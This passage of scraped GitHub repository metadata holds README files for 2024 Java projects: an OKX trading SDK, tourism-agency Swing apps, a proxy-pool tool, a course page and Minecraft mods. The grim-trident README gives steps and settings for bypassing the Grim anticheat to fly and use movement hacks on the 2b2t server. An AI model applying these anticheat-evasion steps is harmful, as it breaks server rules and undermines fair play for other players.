    - [x] [Funding rate channel](https://www.okx.com/docs-v5/en/#public-data-websocket-funding-rate-channel)
    - [x] [Price limit channel](https://www.okx.com/docs-v5/en/#public-data-websocket-price-limit-channel)
    - [x] [Option summary channel](https://www.okx.com/docs-v5/en/#public-data-websocket-option-summary-channel)
    - [x] [Estimated delivery/exercise price channel](https://www.okx.com/docs-v5/en/#public-data-websocket-estimated-delivery-exercise-price-channel)
    - [x] [Mark price channel](https://www.okx.com/docs-v5/en/#public-data-websocket-mark-price-channel)
    - [x] [Index tickers channel](https://www.okx.com/docs-v5/en/#public-data-websocket-index-tickers-channel)
    - [x] [Mark price candlesticks channel](https://www.okx.com/docs-v5/en/#public-data-websocket-mark-price-candlesticks-channel)
    - [x] [Index candlesticks channel](https://www.okx.com/docs-v5/en/#public-data-websocket-index-candlesticks-channel)
    - [x] [Liquidation orders channel](https://www.okx.com/docs-v5/en/#public-data-websocket-liquidation-orders-channel)
    - [x] [ADL warning channel](https://www.okx.com/docs-v5/en/#public-data-websocket-adl-warning-channel)
    - [x] [Economic calendar channel](https://www.okx.com/docs-v5/en/#public-data-websocket-economic-calendar-channel)
  - [Funding Account](https://www.okx.com/docs-v5/en/#funding-account-websocket)
    - [x] [Deposit info channel](https://www.okx.com/docs-v5/en/#funding-account-websocket-deposit-info-channel)
    - [x] [Withdrawal info channel](https://www.okx.com/docs-v5/en/#funding-account-websocket-withdrawal-info-channel)

## How to use

### Maven

```xml

<dependency>
    <groupId>xyz.felh</groupId>
    <artifactId>okx-v5-java</artifactId>
    <version>0.5.2024072701</version>
</dependency>
```

### Gradle

```yaml
implementation group: 'xyz.felh', name: 'okx-v5-java', version: '0.5.2024072701'
```

### sbt

```javascript
libraryDependencies += ""xyz.felh"" % ""okx-v5-java"" % ""0.5.2024072701""
```

## Important

- #### Automatically login when reconnected websocket if it has been login to PRIVATE channel
- #### Automatically restore all subscribe channels when reconnected websocket


## License

Published under the MIT License (https://github.com/forestwanglin/okx-v5-java/blob/main/LICENSE)",OKX V5 SDK for JAVA,,2024-04-09T12:20:50Z,2024-07-27T12:42:08Z,,0,1,0,24,0,6,15,1,0,MIT,Java
Jihedbz/JavaFx-User-Management,main,# JavaFx-User-Management,,,2024-04-16T00:03:42Z,2024-05-03T11:29:06Z,,0,1,0,11,0,0,15,1,0,MIT,Java
xyzbtw/rusherGUI,main,"A pretty simple gui to show an example of how to make themes.

![Gui screenshot](https://github.com/xyzbtw/rusherGUI/blob/main/image.png?raw=true)
",RH themeGUI example,,2024-04-13T03:33:37Z,2024-05-29T20:23:35Z,2024-04-16T04:57:27Z,2,3,1,42,0,2,15,1,0,NOASSERTION,Java
besteceltek/TourismAgency,main,"# Turizm Acente Sistemi

Bu proje, Patika Turizm Acentesi'nin günlük operasyonlarını dijitalleştirmeyi ve müşteri rezervasyon süreçlerini optimize etmeyi amaçlamaktadır. Şu anda projenin eksikleri aşağıda belirtilmiştir:

## Proje İsterleri

1. **Veritabanı:** Veritabanı tabloları aşağıdaki gibi oluşturulmalıdır:
   - `user`: admin ve acente çalışanı kullanıcı bilgilerini tutar.
   - `hotel`: otel bilgilerini tutar.
   - `season`: otel sezon kayıtlarını tutar.
   - `pension`: otel pansiyon tiplerini tutar.
   - `room`: otel odalarını ve özelliklerini tutar.
   - `reservation`: odaya yapılan rezervasyonları tutar.
   - `hotel_features`: otel özelliklerini tutar.

2. **Arayüz Tasarımı:** Java Swing kullanılmalıdır. Arayüz, kullanıcı dostu olmalı ve kendine özgü bir tasarıma sahip olmalıdır.

3. **Kullanıcı Yönetimi:** Admin panelinden kullanıcıları eklemek, düzenlemek ve silmek mümkün olmalıdır. Kullanıcıların rolleri (admin, personel) belirlenmelidir.

4. **Otel Yönetimi:** Otel ekleme ve listeleme işlevleri sağlanmalıdır. Otelin özellikleri, pansiyon tipleri ve dönemleri kaydedilmelidir.

5. **Dönem Yönetimi:** Otelin dönemleri belirlenmeli ve fiyatlandırmalar bu dönemlere göre yapılmalıdır.

6. **Oda Yönetimi:** Oda ekleme ve listeleme işlevleri sağlanmalıdır. Odaların fiyatlandırması ve özellikleri belirlenmelidir.

7. **Fiyatlandırma:** Odaların fiyatlandırması otelin dönemine, pansiyon tipine ve misafir sayısına göre otomatik olarak hesaplanmalıdır.

8. **Oda Arama ve Rezervasyon:** Acente çalışanları sisteme girdiği tarih aralığına, şehire veya otel adına göre oda arama yapabilmelidir. Rezervasyon işlemi tamamlandığında toplam fiyat otomatik olarak hesaplanmalı ve stok bilgisi güncellenmelidir.

## Proje Yolculuğu

Projenin detaylarına ilişkin kapsamlı bir bakış için aşağıdaki resme tıklayıp videoyu izleyebilirsiniz.

[<img width =""300px"" src=""https://taplink.st/a/0/2/4/2/66bd8f.png?1"">](https://youtu.be/xjMg8fm_piQ)

### Başlangıç

Projeye başlarken ilk olarak giriş sayfasını ve admin kullanıcının göreceği arayüzü oluşturdum. Bu adımın ardından backend kısmını da hazırladım.

<img width=""300px"" src=""/images/Screenshot%202024-04-29%20at%2020.56.36.png"" /><img width=""600px"" src=""/images/Screenshot%202024-04-29%20at%2020.56.49.png"" />

### İlerleme

Daha sonra sırasıyla otel, oda ve rezervasyon arayüzlerini ekledim ve her birinin backend kısmını yazdım.

<img width=""600px"" src=""/images/Screenshot%202024-04-29%20at%2020.57.23.png"" />
<img width=""600px"" src=""/images/Screenshot%202024-04-29%20at%2020.58.04.png"" />
<img width=""600px"" src=""/images/Screenshot%202024-04-29%20at%2021.35.38.png"" />

### Sonuç

Bu adımların ardışık olarak ilerlemesi, daha az hata ile karşılaşmamı ve temiz kod yazmamı sağladı. Projede SOLID prensiplerine uygun olmaya çalıştım ve her arayüzde yeni bir özellik ekleyerek daha fazla deneyim kazanmaya odaklandım.

## Teknik Detaylar

- **Veritabanı:** PostgreSQL 16 kullanıldı.
- **Arayüz:** Java Swing kullanıldı.
- **Java SDK Sürüm:** Java SDK 21 sürümü kullanıldı.
",,,2024-04-24T14:26:55Z,2024-04-30T12:06:16Z,,0,2,0,20,0,0,15,1,0,MIT,Java
Yldrmceyy/TourismManagmentSystem,master,"# Tourism Managament System
This project encompasses a Java application developed to manage tourism agency operations. The project consists of five main packages: DAO (Data Access Object), Business, Entity, Core, and View.


## About the project
The tourism agency project is a comprehensive application that offers a wide range of services, including hotel management, room reservations, customer information, and user management. This project involves adding hotels, managing rooms, making reservations, and updating customer information. Additionally, it allows the creation of users in different roles (admin and employee), enabling more effective management of business processes. As a result, the tourism agency project facilitates travel and accommodation processes, providing services in accordance with industry standards.


## Used Technologies

- __Java JDK 19__ :
  Development of the project has been carried out using the Java programming language. Java was chosen for its platform independence and powerful object-oriented programming features.

- __Swing (UI Library)__ :
 Java Swing framework has been utilized for developing the user interface (UI). Swing offers a wide range of components for Java-based desktop applications.

- __PostgreSQL__ :
 PostgreSQL has been chosen as the database management system. PostgreSQL provides a reliable, open-source, and scalable relational database management system. The project stores customer information, hotel, and reservation data in a PostgreSQL database.

- __JDBC (Java Database Connectivity)__ :
 JDBC, a standard API for accessing databases in Java applications, has been employed. Through this API, the project connects to the PostgreSQL database and performs operations.

- __IntelliJ IDEA__ :
IntelliJ IDEA has been used for the development and management of the project. IntelliJ IDEA is an integrated development environment that facilitates Java development and enhances productivity.

## Project Structure
The project is comprised of five main packages:



## Project File Directory
  ```sh 
TourismAgency/
|
├── business/       ---> Classes containing business logic operations.
│    └──
│ 
├── core/          ---> Fundamental helper classes and tools.
│    └── (...)
│
├── dao/            ---> Data Access Objects managing database operations.
│    └── (...)
│
├── entity/          ---> Entity classes representing database tables.
|     └── (...)
|
├── view/            ---> Classes containing User Interface (UI) components
|     └── (...)
|
├── App
|
└── README.md
   ````

__*DAO (Data Access Object) package:*__  <br> This package handles database operations. It contains code that directly interacts with the database and abstracts data access. This way, database operations are isolated from other layers, making changes easier.

__*Business package:*__  <br>    This is the layer where business logic operations are performed. Data retrieved from the database is processed, business rules are applied, and results are generated. For example, operations like customer reservations, tour planning, etc., are carried out in this layer.

__*Entity package:*__ <br>    It contains data models that map to database tables. These models are used to represent data in the database. For instance, classes representing a customer or a tour reservation can be found in this package.

__*Core package:*__   <br>   This package includes general utility functions and code intended for general use across different layers of the application.

__*View package:*__    <br> This package includes code related to the user interface (UI). It provides data presentation to the user and manages user interaction with the application. For example, screens where users can view tour reservations or make new tour reservations can be found in this package.


# Features

## Hotel Management
- Create, view, edit, and delete hotel entries.
- Manage hotel information including updates and deletions.

## Room Management
- Add, view, edit, and delete room entries within hotels.
- Control room details such as availability, pricing, and features.

## Reservation Management
- Make, view, update, and cancel reservations seamlessly.
- Efficiently manage reservation information and status updates.

## User Management
- Add, view, update, and delete user profiles.
- Assign roles such as ""admin"" and ""employee"" to users for access control and privileges.



## Example Use Cases
### Adding a New Hotel:
**1.** Navigate to the main screen and click on the ""Add Hotel"" button.<br>
**2.** Fill in the required details for the new hotel.<br>
**3.** Save the information, and the new hotel will be added to the system.<br>
**4.** Visit the ""Hotel List"" tab to view the newly added hotels.<br>

### Adding a New Room: 
**1.** Access the ""Add Room"" tab within the application.<br>
**2.** Select the desired hotel to add the room to.<br>
**3.** Enter the relevant details for the new room, such as room type, availability, and pricing.<br>
**4.** Save the changes, and the new room will be added to the selected hotel.<br>

### Making a Reservation: 
**1.** Go to the ""Make Reservation"" tab in the application.<br>
**2.** Choose the hotel where you want to make the reservation.<br>
**3.** Select the desired room type and specify the reservation details such as check-in and check-out dates.<br>
**4.** Confirm the reservation, and it will be successfully made in the system.<br>

### User Creation: 
**1.** Access the ""Users"" tab within the application.<br>
**2.** Click on the option to create a new user profile.<br>
**3.** Enter the user's details and assign an appropriate role, either ""admin"" or ""employee"".<br>
**4.** Save the changes, and the new user will be added to the system with the assigned role.<br>

### Reservation Update/Delete: 
**1.** Navigate to the ""Reservations"" tab to view existing reservations.<br>
**2.** Select the reservation you want to update or delete.<br>
**3.** Make the necessary modifications to the reservation details or choose to delete it entirely.<br>
**4.** Save the changes, and the reservation will be updated or removed from the system.<br> 


## Project Promotional Video
[https://www.youtube.com/watch?v=MCWyehN0A_E](https://youtu.be/EmSsMbuue9A) 


## Requirements
- Java JDK 19
- PostgreSQL database
","🧳 The Hotels Management System is designed to streamline daily operations and accelerate the reservation process. Featuring a user-friendly interface, flexible pricing options, and automated calculations, this system enhances efficiency and reduces the need for manual tasks.","java,swing-gui",2024-04-23T21:21:12Z,2024-04-26T18:09:01Z,,0,2,0,27,0,0,15,1,0,,Java
sahilshelangia/system-design,main,"# System Design Repository

Welcome to the System Design Repository! This repository is a collection of resources, examples, and guides for system design, focusing on both Low-Level Design (LLD) and High-Level Design (HLD).

## Table of Contents

- [Introduction](#introduction)
- [Low-Level Design (LLD)](#low-level-design-lld)
- [High-Level Design (HLD)](#high-level-design-hld)
- [Recommended books](#recommended-books)
- [About me]()

## Introduction
This repository aims to provide resources to understand both aspects of system design i.e, LLD and HLD, along with super practical examples.

## Low-Level Design (LLD)
This repository have detailed content on the following topics.
- ### Basics
  - [ ] Class Diagram
  - [ ] SOLID Principle
- ### Design patterns
  - #### Creational
    - [ ] Factory Pattern
    - [ ] Abstract Factory
    - [ ] Singleton Pattern
    - [ ] Builder Pattern
    - [ ] Prototype Pattern
  - #### Structural
    - [ ] Decorator Pattern
    - [X] Proxy Pattern
    - [X] Composite Pattern
    - [X] Adapter Pattern
    - [ ] Facade Pattern
    - [ ] Flyweight Pattern
    - [ ] Bridge Pattern
  - #### Behavioural
    - [ ] Interpreter Pattern
    - [ ] Visitor Pattern
    - [ ] Mediator Pattern
    - [ ] Iterator Pattern
    - [ ] Command Pattern
    - [ ] Memento Pattern
    - [ ] Template Method Pattern
    - [ ] State Pattern
    - [ ] Chain of responsibility
    - [ ] Strategy Pattern
    - [ ] Observer Pattern
- ### Problems (machine coding)
  - [ ] Design tic-tac-toe game
  - [ ] Design ATM Machine
  - [ ] Design splitwise
  - [ ] Design traffic light management system
  - [ ] Design car rental system
  - [ ] Design file system
  - [ ] Design chess game
  - [ ] Design snake ladder game
  - [ ] Design concurrent Data Structure (e.g., Lock-Free Queue)
  - [ ] Design parking lot
  - [ ] Design elevator system
  - [ ] Designing a Database Connection Pool
  - [ ] Design logging system
  - [ ] Design a compiler or Interpreter
  - [ ] Design Vending machine
  - [ ] Design movie booking System (eg- Book my show)
  - [ ] Design A Browsers history
  - [ ] Design simplified version of twitter
  - [ ] Design text editor and LRU cache

## High-Level Design (HLD)
This repository have detailed content on the following topics.

### Basics
- [ ] CAP theorem
- [ ] Envelope Estimation
- [ ] Bloom filters
- [ ] Caching
- [ ] Load balancer
- [ ] Proxy & Reverse Proxy
- [ ] Replication
- [ ] Partitioning
- [ ] Consistent Hashing
- [ ] Rate limiter
- [ ] DNS
- [ ] Understand the scaling of each component
- [ ] Transaction
- [ ] Trouble with distributed system
- [ ] Consistency & Consensus
- [ ] Seven layered architecture
- [ ] JWT
- [ ] Service discovery
- [ ] Clock skewness

### Problems
- [ ] Design a distributed key-value store
- [ ] Design unique id generator
- [ ] Design url shortener
- [ ] Design notification system
- [ ] Design a social media feed platform
- [ ] Design chat application like WhatsApp
- [ ] Design a distributed messaging system
- [ ] Design twitter search
- [ ] Design web crawler
- [ ] Design music streaming system
- [ ] Design video streaming system
- [ ] Design ride-sharing system (eg- Uber)
- [ ] Design a recommendation system (eg- Netflix)
- [ ] Design ecommerce platform (eg- Amazon)
- [ ] Design distributed search engine


## Recommended books
- ### High level design
  - [System Design Interview – An insider's guide](https://www.amazon.com/System-Design-Interview-insiders-Second/dp/B08CMF2CQF)
  - [Design data intensive application](https://www.oreilly.com/library/view/designing-data-intensive-applications/9781491903063/)
- ### Low level design
  - [Head first design pattern](https://www.oreilly.com/library/view/head-first-design/0596007124/)
  - [Elements of Reusable Object-Oriented Software](https://www.oreilly.com/library/view/design-patterns-elements/0201633612/)
  - [Clean Code](https://www.oreilly.com/library/view/clean-code-a/9780136083238/)

## About me
- [Linkedin](https://www.linkedin.com/in/sahil-yadav-iiitm/)
- [Youtube](https://www.youtube.com/channel/UC7vrnt2xRdx8km5ly8M4Ppg)",This repository contains system-design resources for both low-level and high-level design.,,2024-04-21T16:21:54Z,2024-05-05T17:10:36Z,,0,1,0,11,0,5,14,1,0,,Java
ahmedaliibrahim01/TourismAgencyManagementSystem,main,"
# Tourism Agency Management System

## Description
Tourism Agency Management System Promotional Video

Link : https://drive.google.com/drive/folders/1v4aX8t81EfQar818K_pRkrHmEdlIcigX?usp=sharing

This project aims to create a digital management system for Patika Tourism Agency to streamline its daily operations in the hotel sector and optimize customer reservation processes.


## Table of Contents

- [Description](#description)
- [Technologies](#technologies)
- [Project Overview](#project-overview)
- [Features](#features)
- [Installation](#installation)
    - [Clone](#clone)
    - [Permission Table](#permission-table)
- [Database Design](#database-design)
- [Coding Practices](#coding-practices)
- [Screenshots](#screenshots)

## Technologies

- Java 21
- Swing Framework
- PostgreSQL
- IntelliJ IDEA

## Project Overview

The project consists of 3 main parts: **Hotel Management**, **User Management** and **Reservation Management**.

## Features

- **User Management:**
    - Admin can add, delete, update, and filter users based on their roles (admin, staff).

- **Hotel Management:**
    - List hotels with details such as name, address, star rating, and amenities.
    - Add new hotels with information like email, phone, and location.
    - Specify accommodation types (pension types) offered by each hotel.

- **Room Management:**
    - List rooms for each hotel with details like type, features, and availability.
    - Add new rooms, specifying type, features, and stock quantity.

- **Season Management:**
    - Define historical seasons to adjust room pricing based on periods.
    - Specify start and end dates for each season.

- **Pricing Management:**
    - Set dynamic pricing for rooms based on seasons and accommodation types.
    - Differentiate prices for adults and children.

- **Room Search:**
    - Search available rooms based on city, date range, and hotel name.
    - Display relevant information about hotels and rooms that match the search criteria.

- **Reservation Operations:**
    - List existing reservations with details like check-in/out dates, guests, and total price.
    - Add new reservations by selecting available rooms and providing guest information.
    - Delete or update existing reservations.
- **Security:**
    - Users are required to log in to the system with their credentials.
    - 
## Installation

### Clone

1. Clone the repository: `git clone https://github.com/ahmedaliibrahim01/Tourism_Agency_System.git`
2. Navigate to the project directory: `cd Tourism_Agency_System`
3. Open the project in your IDE
4. Create a database named `tourismagencysystem` in PostgreSQL or change the database name in the `src/main/java/agency/core/Db.java` file
5. Import the `tourismagencysystem.sql`
6. Run the project

### Permission Table

### Admin

- User Management: Admin can list, add, delete, update, and filter users based on their roles (admin, staff).

### Employee (Agency Staff)

- Hotel Management: List and add hotels.
- Room Management: List and add rooms.
- Season Management: List and add seasons.
- Pricing Management.
- Room Search.
- Reservation Operations: List, add, delete, and update reservations.


## Database Design

The system uses a relational database with the following tables:

- `user`: Stores user information.
- `hotel`: Stores hotel information.
- `hotel_season`: Stores seasonal information for hotels.
- `hote_pension`: Stores pension types for hotels.
- `hotel_room`: Stores room information.
- `reservation`: Stores reservation details.

The project uses Swing for the graphical user interface, providing a user-friendly experience for both admins and employees.

### Coding Practices

- Variable and function names are clear and self-explanatory.
- Code readability and formatting are maintained with proper indentation.
- Comments and documentation are provided for better understanding.
- The code is modular and reusable.

## Screenshots

Include screenshots here to visually showcase the application's interface and features.
","The Tourism Agency Management System enhances the efficiency of Patika Tourism Agency by optimizing hotel operations and customer reservations. It offers a digital solution for managing hotels, users, rooms, seasons, and pricing.",,2024-04-11T13:13:59Z,2024-05-30T18:41:11Z,,0,2,0,42,0,0,14,1,0,,Java
5cmc/grim-trident,master,"## 5C Grim Trident Bypass
If you like this consider insiding for us.

## Usage
- Download [MeteorClient](https://meteorclient.com) for 1.20.4
- Download [GrimTrident](https://github.com/5cmc/grim-trident/releases/latest)
- Place a trident enchanted with riptide in your hotbar

**Use the following settings to creative fly on 2b2t:**
  - Enable the `Grim Disabler` module
  - Enable the `Flight` module and tune the `speed` until you stop getting rubber-banded (0.25 is a good starting point)

**Other useful modules that can be used with** `Grim Disabler` **are:**
  - Anti Hunger
  - Air Jump
  - Boat Fly
  - Click Tp
  - Elytra Fly
  - Jesus
  - Step (and Reverse Step)
  - Velocity
  - No Slow

If it breaks try landing, turning off all movement hacks, and eating something.

## Module Options
`Grim`
 - Required for servers using Grim Anticheat (like 2b2t)

`Overdrive`
  - Good for travelling but buggy when breaking/placing blocks

`Pause on eat`
  - Stops sending trident packets when interacting with items
  - Allows you to eat while using Grim Disabler

`Pause on inventory`
  - Stops sending trident packets when picking up items with your cursor
  - Allows you to pick up and move items around your inventory while using Grim Disabler

## License
The [Skid License](./LICENSE)

## Build
- Get Java 17
- Clone it `git clone https://github.com/5cmc/grim-trident`
- Build it `./gradlew build`
",,,2024-04-14T02:32:14Z,2024-04-28T10:31:23Z,2024-04-28T10:31:23Z,4,14,0,68,2,0,14,1,0,NOASSERTION,Java
garlic-bred/easy-bedrock-breaker,master,"# Easy Bedrock Breaker

# For 1.21 this mod has been moved to [breadclient](https://github.com/garlic-bred/breadclient)

It's lag based bedrock breaking but you lag your client instead of the server.
In case you have never heard of lag based bedrock breaking, [here](https://youtu.be/FL0VHAQLPJs) is a video about it.

You can click [this link](https://youtu.be/SLL8uwEe5fc) to see how to use the mod.

Basically when you press a keybind, it delays a couple types of packets from being sent to the server until you release the keybind. So the server does not know what you are doing until you release the keybind.

You will need an efficiency 5 diamond pickaxe or better, some pistons, and some redstone torches. Haste is not required.
May or may not work on modded servers. Definitely works in singleplayer or vanilla servers.
",,,2024-04-05T06:18:40Z,2024-08-21T23:38:50Z,2024-04-05T08:44:54Z,1,1,3,5,0,3,14,1,1,CC0-1.0,Java
Keremyardan/Tourism_Agency,master,"A tourism agency system created with Java Swing and powered with PostgreSQL. 

You may create employee or admin accounts. Each account has different skills.

Such as, 

Admins can create or delete two different account types, change roles and passcodes.

On the employee side, you may add hotels, hotel stars, and different service features like ""wi-fi"" or ""gym"".

An employee may create a reservation by entering season type, individual amount and price as currency amount.  

And of course editing or deleting for a reservation is possible as well.

You may reach to the project video by clicking the link below;

https://youtu.be/i96mvn4MCA4

And repo link below as well;

https://github.com/Keremyardan/Tourism_Agency.git

JDK version : 21.0.1
",A Java Swing project for hotel management,,2024-04-24T13:45:10Z,2024-09-22T19:55:05Z,,0,2,0,7,0,0,14,1,0,,Java
ProdPreva1l/Fadah,master,"[![CodeFactor](https://www.codefactor.io/repository/github/prodpreva1l/fadah/badge)](https://www.codefactor.io/repository/github/prodpreva1l/fadah)
## Fadah (Finally a Decent Auction House) is the fast, modern and advanced auction house plugin that you have been looking for!

- Spigot/Download: https://www.spigotmc.org/resources/fadah-finally-a-decent-auction-house.116157/
- Docs: https://docs.vote-preva1l.today/

#### Features:
- Item Searching
- Item Filtering
- Infinite & Configurable Categories
- Folia & ShreddedPaper Support
- Multi Server Support
- Multiple Databases Supported
- Fast Bug Fixes
- Used & battle tested in large production environments
- Configurable Max Listings
- Highly Configurable
- Transaction Logs

#### Commands
----------------------------------------
/ah | fadah.use
/ah help | fadah.help
/ah sell <amount> | fadah.use
/ah toggle | fadah.toggle-status
/ah reload | fadah.reload
/ah profile | fadah.profile
/ah expired | fadah.expired-items
/ah redeem | fadah.collection-box

Permissions:
- `fadah.max-listings.<amount>` - How many items the user can list on the auction house at any one time
- `fadah.listing-tax.<percent>` - The percent a user should be taxed from the products price
- `fadah.advert-price.<amount>` - How much an advert should cost
- `fadah.manage.<command>` - Allows the user to manage other peoples profiles etc

Support: https://discord.gg/4KcF7S94HF

Requirements:
- Vault & Compatible Economy Plugin
- (Optional) A database (MySQL, MariaDB, MongoDB)
- (Optional) Redis
","Finally a Decent AuctionHouse, is the fast, modern and advanced auction house plugin that you have been looking for!",,2024-04-13T03:54:38Z,2024-09-23T06:56:18Z,2024-08-24T14:23:41Z,15,4,8,168,0,3,14,3,0,Apache-2.0,Java
yint-tech/ProxyCompose,main,"# ProxyCompose

这是malenia的开源分支，主要用于给商业代码引流😊

ProxyCompose是一个对代理IP池进行二次组合的工具，用户可以将多个采购的IP资源进行二次组合，使用统一的账户密码，服务器端口等信息进行统一访问。

交流群： 加微信：（iinti_cn）拉入微信交流群

## 特性

1. 访问统一：如论是什么IP资源供应商，业务代码均接入ProxyCompose，IP资源供应商的变动不会影响业务代码
2. 池间路由：对于多个IP资源供应商，支持浮动流量比例动态调控，即根据IP池健康评估，弹性伸缩各个IP池的流量。某个IP池挂了不影响整体业务
3. 协议转换：你可以使用ProxyCompose实现http/https/socks5几种代理协议的转换，这样即使采购的代理资源仅支持socks5，也能转换为https代理
4. 池化加速：ProxyCompose内置了一个高效的IP池模块，可以对IP资源的访问进行探测、评分、连接池等工作，提高IP资源使用成功率

## 使用

### 构建

- 安装Java
- 安装maven
- Linux/mac下，执行脚本：``build.sh``，得到文件``target/proxy-compose.zip``即为产出文件
- 配置： 请根据实际情况配置代理资源 ``conf/config.ini``
- 运行脚本：``bin/ProxyComposed.sh`` 或 ``bin/ProxyComposed.bat``
- 代理测试：``curl -x iinti:iinti@127.0.0.1:36000 https://www.baidu.com/``

**如不方便构建，可以使用我们构建好的发布包:[https://oss.iinti.cn/malenia/proxy-compose.zip](https://oss.iinti.cn/malenia/proxy-compose.zip)**

### 最简配置

```ini
[global]
# 鉴权用户，即用户连接到proxy_compose的鉴权
auth_username=iinti
# 鉴权密码
auth_password=iinti

# 定义IP资源，即从IP供应商采购的IP资源,要求至少配置一个IP资源
[source:dailiyun]
# IP资源下载连接
loadURL=http://修改这里.user.xiecaiyun.com/api/proxies?action=getText&key=修改这里&count=修改这里&word=&rand=false&norepeat=false&detail=false&ltime=0
# Ip供应提供的代理账户（如果是白名单，后者无鉴权，则无需配置）
upstreamAuthUser=修改这里
# Ip供应提供的代密码
upstreamAuthPassword=修改这里
# IP池大小，重要
poolSize=10
```

### 完整配置

```ini
[global]
# 开启debug将会有更加丰富的日志
debug=false
# 对代理IP质量进行探测的URL
proxyHttpTestURL = https://iinti.cn/conn/getPublicIp?scene=proxy_compose
# 代理服务器启动端口，本系统将会在配置端口范围连续启动多个代理服务器
mappingSpace=36000-36010
# 是否启用随机隧道，启用随机隧道之后，每次代理请求将会使用随机的IP出口
randomTurning=false
# 是否启用池间路由，池间路由支持根据IP池的健康状态在多个IP池之间动态调整比例
enableFloatIpSourceRatio=true
# failover次数，即系统为失败的代理转发进行的充实
maxFailoverCount=3
# 代理连接超时时间
handleSharkConnectionTimeout=5000
# 鉴权用户，即用户连接到proxy_compose的鉴权
auth_username=iinti
# 鉴权密码
auth_password=iinti
# 使用IP白名单，或者IP端的方式进行鉴权
auth_white_ips=122.23.43.0/24,29.23.45.65

# 定义IP资源，即从IP供应商采购的IP资源,要求至少配置一个IP资源
# section 要求以 《source:》开始
[source:dailiyun]
# 本资源是否启用，如果希望临时关闭本资源，但是不希望删除配置，可以使用本开关
enable=true
# IP资源下载连接
loadURL=http://修改这里.user.xiecaiyun.com/api/proxies?action=getText&key=修改这里&count=修改这里&word=&rand=false&norepeat=false&detail=false&ltime=0
# IP资源格式，目前支持plain，json两种格式，其中json格式需要满足json格式要求 cn.iinti.proxycompose.resource.ProxyIp
resourceFormat=plain
# Ip供应提供的代理账户（如果是白名单，后者无鉴权，则无需配置）
upstreamAuthUser=修改这里
# Ip供应提供的代密码
upstreamAuthPassword=修改这里
# IP池大小，非常重要，此字段为您的IP供应商单次提取返回的节点数
poolSize=10
# 本IP资源池是否需要探测IP质量，如开启，则IP需要被验证可用后方可加入IP池
needTest=true
# IP资源下载间隔时间，单位秒
reloadInterval=240
# IP资源入库后最长存活时间，单位秒，达到此时间后，对应IP资源将会从IP池中移除，除非被重新下载到IP池中
maxAlive=300
# 当前IP资源支持的代理协议（建议至少选择支持socks5的资源）
supportProtocol=socks5,https,http
# 连接池连接空转时间，单位秒，IP池将会提前创建到代理真实代理服务器的连接，给业务使用提供加速功能
connIdleSeconds=20
# 提前创建连接的时间间隔，单位秒
makeConnInterval=20
# 当前IP池在池间流量比例，当存在多个Ip资源配置时，本配置有效，即业务按照此比例对多个IP池进行流量情切
ratio=1
```

## 特别说明

ComposeProxy本身能做的工作非常丰富，更多想象空间可以参考我们对应的商业分支：[malenia](https://malenia.iinti.cn/malenia-doc/)
用户如提交任何新的功能（即使和商业分支重叠）均可以被接收",ProxyCompose是一个对代理IP池进行二次组合的工具，用户可以将多个采购的IP资源进行二次组合，使用统一的账户密码，服务器端口等信息进行统一访问。,,2024-04-14T06:53:34Z,2024-04-15T13:53:55Z,,0,0,0,4,0,3,14,1,0,,Java
EmbarkXOfficial/spring-boot-course,main,"This is the Official repository of **Java Spring Boot: Professional eCommerce Project Masterclass** on Udemy

# The Ultimate Java and Spring Boot Mastery

Welcome to your one-stop-shop for mastering Java and Spring Boot! This repository offers a comprehensive learning experience with high-quality resources and community support. Dive into over 23+ hours of premium content, with everything you need to excel at Java and Spring Boot development.

## 🎓 Learning Roadmap

Most of the courses below are available in **Udemy For Business**, so if you have subscription - you can get FREE access.
Here’s a structured path to enhance your skills with detailed courses available:

1. **[Spring Boot By Building Complex Projects Step by Step](https://link.embarkx.com/spring-boot) (47+ Hours of Content)**
2. **[Master Spring Boot Microservices](https://link.embarkx.com/microservices) (23+ Hours of Content)**
3. **[Learn Java with 60+ Hours of Content](http://link.embarkx.com/java) (60+ Hours of Content)**
4. **[Master Spring Security with React JS + OAuth2](https://link.embarkx.com/spring-security) (23+ Hours of Content)**
5. **[Master IntelliJ IDEA](http://link.embarkx.com/intellij) (3+ Hours of Content)**


## 🌟 With All Our Courses You Gain Access To

- 📝 **Notes:** Detailed and downloadable notes to accompany each lesson.
- 💻 **Source Code:** Full access to the source code used in the tutorials.
- 🤔 **Doubt Solving:** Responsive instructor and community support.
- 🎥 **High-Quality HD Videos:** Easy to understand, high-definition video tutorials.
- 🔄 **Free Lifetime Updates:** Continuous updates to course content at no extra cost.

## 📚 Why Choose This Mastery Series?

With this series, you're not just learning; you're preparing to dominate the field of Java and Spring Boot development. Our structured learning path ensures that you build your skills progressively, with each course designed to build on the knowledge gained from the previous one.

### Join Us Now!

Start your journey today to become a master at Java and Spring Boot. Our community and expert instructors are here to support your learning every step of the way. **Enroll and start building your future, today!**





# Usage Policy for Course Materials

## Instructor Information

**Instructor:** Faisal Memon  
**Company:** [EmbarkX.com](http://www.embarkx.com)

## Policy Overview

This document outlines the guidelines and restrictions concerning the use of course materials provided by EmbarkX, including but not limited to PDF presentations, code samples, and video tutorials.

### 1. Personal Use Only

The materials provided in this course are intended for **your personal use only**. They are to be used solely for the purpose of learning and completing this course.

### 2. No Unauthorized Sharing or Distribution

You are **not permitted** to share, distribute, or publicly post any course materials on any websites, social media platforms, or other public forums without prior written consent from the instructor.

### 3. Intellectual Property

All course materials are protected by copyright laws and are the intellectual property of Faisal Memon and EmbarkX. Unauthorized use, reproduction, or distribution of these materials is **strictly prohibited**.

### 4. Reporting Violations

If you become aware of any unauthorized sharing or distribution of course materials, please report it immediately to [embarkxofficial@gmail.com](mailto:embarkxofficial@gmail.com).

### 5. Legal Action

We reserve the right to take legal action against individuals or entities found to be violating this usage policy.

## Thank You

Thank you for respecting these guidelines and helping us maintain the integrity of our course materials.

## Contact Information

- **Email:** [embarkxofficial@gmail.com](mailto:embarkxofficial@gmail.com)
- **Website:** [www.embarkx.com](http://www.embarkx.com)

",Java Spring Boot: Professional eCommerce Project Masterclass,,2024-04-15T16:10:59Z,2024-08-11T13:46:10Z,,0,1,0,140,0,9,14,1,0,,Java
MoeStick/Skyblock-Extras,main,"# Skyblock-Extras
**Latest version of sbe**

## GUI Screenshot
![Screenshot](https://cdn.discordapp.com/attachments/980371346670374932/1206139903654760508/image.png?ex=65daec52&is=65c87752&hm=609a46e0a169986b8cd0a69b38da30fb5b0e0c3006dd76a17520edde7cb7dfb4&)

### Frequently Asked Questions

Does SBE steal code from other mods?
No, Skyblock Extras does not steal code from any other mods. Here's a list of mods it's often accused of stealing from and why it's not true:
